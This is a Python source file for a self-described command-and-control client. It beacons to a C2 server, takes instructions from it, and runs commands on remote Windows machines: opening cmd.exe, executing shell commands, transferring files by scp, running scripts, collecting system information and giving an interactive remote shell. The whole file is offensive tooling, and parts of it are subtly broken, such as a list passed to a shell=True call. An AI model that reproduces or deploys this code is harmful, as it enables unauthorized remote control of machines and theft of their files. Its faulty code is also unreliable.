import socket
import subprocess
import logging

class C2Client:
    def __init__(self):
        self.c2_server = None
        self.c2_port = None
        self.socket = None

    def connect_to_c2_server(self):
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.connect((self.c2_server, self.c2_port))
            print("Connected to C2 server.")
        except ConnectionRefusedError:
            print("Connection to C2 server refused. Please check the server address and port.")
        except socket.error as e:
            print(f"Socket connection error: {e}")

    def send_beacon(self, message):
        try:
            self.socket.send(message.encode())
            print("Beacon message sent to C2 server.")
        except socket.error as e:
            print(f"Failed to send beacon message: {e}")

    def receive_instructions(self):
        try:
            instructions = self.socket.recv(1024).decode()
            print("Received instructions from C2 server:", instructions)
            return instructions
        except socket.error as e:
            print(f"Failed to receive instructions: {e}")

    def close(self):
        if self.socket:
            self.socket.close()
            print("Socket connection closed.")

    def execute_command(self, command):
        if command == "exit":
            # Handle the exit command
            return "Exiting shell..."
        else:
            # Execute the command on the remote machine
            try:
                output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
                return output.decode()
            except subprocess.CalledProcessError as e:
                return f"Error executing command: {e.output.decode()}"

    def open_command_prompt(self):
        remote_username = input("Enter the username of the remote machine: ")
        remote_machine = input("Enter the address of the remote machine: ")
        try:
            subprocess.run(["ssh", f"{remote_username}@{remote_machine}", "cmd.exe"])
            print("Command prompt opened on the remote Windows machine.")
        except subprocess.CalledProcessError:
            print("Failed to open command prompt on the remote machine.")

    def execute_remote_command(self):
        remote_username = input("Enter the username of the remote machine: ")
        remote_machine = input("Enter the address of the remote machine: ")
        command = input("Enter the command to execute on the remote machine: ")
        try:
            subprocess.run(["ssh", f"{remote_username}@{remote_machine}", command], check=True)
            print(f"Command executed on the remote machine: {command}")
        except subprocess.CalledProcessError:
            print("Failed to execute the command on the remote machine.")

    def download_file_from_remote(self):
        file_path = input("Enter the path of the file to download from the remote machine: ")
        remote_username = input("Enter the username of the remote machine: ")
        remote_machine = input("Enter the address of the remote machine: ")
        try:
            subprocess.run(["scp", f"{remote_username}@{remote_machine}:{file_path}", "."], check=True)
            print(f"File downloaded from the remote machine: {file_path}")
        except subprocess.CalledProcessError:
            print("Failed to download the file from the remote machine.")

    def upload_file_to_remote(self):
        local_file_path = input("Enter the path of the local file to upload: ")
        remote_username = input("Enter the username of the remote machine: ")
        remote_machine = input("Enter the address of the remote machine: ")
        remote_file_path = input("Enter the destination path on the remote machine: ")
        try:
            subprocess.run(["scp", local_file_path, f"{remote_username}@{remote_machine}:{remote_file_path}"], check=True)
            print(f"File uploaded to the remote machine: {local_file_path} -> {remote_file_path}")
        except subprocess.CalledProcessError:
            print("Failed to upload the file to the remote machine.")

    def run_script_on_remote(self):
        script_path = input("Enter the path of the script to run on the remote machine: ")
        remote_username = input("Enter the username of the remote machine: ")
        remote_machine = input("Enter the address of the remote machine: ")
        try:
            subprocess.run(["ssh", f"{remote_username}@{remote_machine}", f"python {script_path}"], check=True)
            print(f"Script executed on the remote machine: {script_path}")
        except subprocess.CalledProcessError:
            print("Failed to execute the script on the remote machine.")

    def retrieve_system_info(self):
        remote_username = input("Enter the username of the remote machine: ")
        remote_machine = input("Enter the address of the remote machine: ")
        try:
            subprocess.run(["ssh", f"{remote_username}@{remote_machine}", "systeminfo"], check=True)
            print("System information retrieved from the remote machine.")
        except subprocess.CalledProcessError:
            print("Failed to retrieve system information from the remote machine.")

    def remote_shell_interaction(self):
        remote_username = input("Enter the username of the remote machine: ")
        remote_machine = input("Enter the address of the remote machine: ")
        print("Enter 'exit' to exit the remote shell.")
        while True:
            command = input("Remote Shell $ ")
            output = self.execute_command(["ssh", f"{remote_username}@{remote_machine}", command])
            if output:
                print(output)
            if command == "exit":
                break

    def handle_instruction(self, instruction):
        if instruction == "open_cmd":
            self.open_command_prompt()
        elif instruction == "execute_command":
            self.execute_remote_command()
        elif instruction == "download_file":
            self.download_file_from_remote()
        elif instruction == "upload_file":
            self.upload_file_to_remote()
        elif instruction == "run_script":
            self.run_script_on_remote()
        elif instruction == "get_system_info":
            self.retrieve_system_info()
        elif instruction == "remote_shell":
            self.remote_shell_interaction()
        else:
            print("Unknown instruction:", instruction)

def main():
    client = C2Client()

    while True:
        print("C2 Client Menu:")
        print("1. Connect to C2 server")
        print("2. Disconnect from C2 server")
        print("3. Pass instruction")
        print("4. Exit")

        choice = input("Enter your choice: ")

        if choice == "1":
            client.c2_server = input("Enter C2 server address: ")
            client.c2_port = int(input("Enter C2 server port: "))
            client.connect_to_c2_server()

        elif choice == "2":
            client.close()

        elif choice == "3":
            print("Instruction Examples:")
            print("1. Open command prompt on the remote Windows machine (open_cmd)")
            print("2. Execute a command on the remote machine (execute_command)")
            print("3. Download a file from the remote machine (download_file)")
            print("4. Upload a file to the remote machine (upload_file)")
            print("5. Run a script on the remote machine (run_script)")
            print("6. Retrieve system information from the remote machine (get_system_info)")
            print("7. Remote shell interaction (remote_shell)")
            example_choice = input("Enter the example instruction number (or type your own instruction): ")

            if example_choice == "1":
                instruction = "open_cmd"
                client.handle_instruction(instruction)
            elif example_choice == "2":
                instruction = "execute_command"
                client.handle_instruction(instruction)
            elif example_choice == "3":
                instruction = "download_file"
                client.handle_instruction(instruction)
            elif example_choice == "4":
                instruction = "upload_file"
                client.handle_instruction(instruction)
            elif example_choice == "5":
                instruction = "run_script"
                client.handle_instruction(instruction)
            elif example_choice == "6":
                instruction = "get_system_info"
                client.handle_instruction(instruction)
            elif example_choice == "7":
                instruction = "remote_shell"
                client.handle_instruction(instruction)
            else:
                instruction = example_choice
                client.send_beacon(instruction)
                instructions = client.receive_instructions()
                if instructions:
                    parsed_instructions = instructions.split(",")
                    for instruction in parsed_instructions:
                        client.handle_instruction(instruction)

        elif choice == "4":
            if client.socket:
                client.close()
            print("Exiting...")
            break

        else:
            print("Invalid choice. Please try again.")

if __name__ == '__main__':
    main()
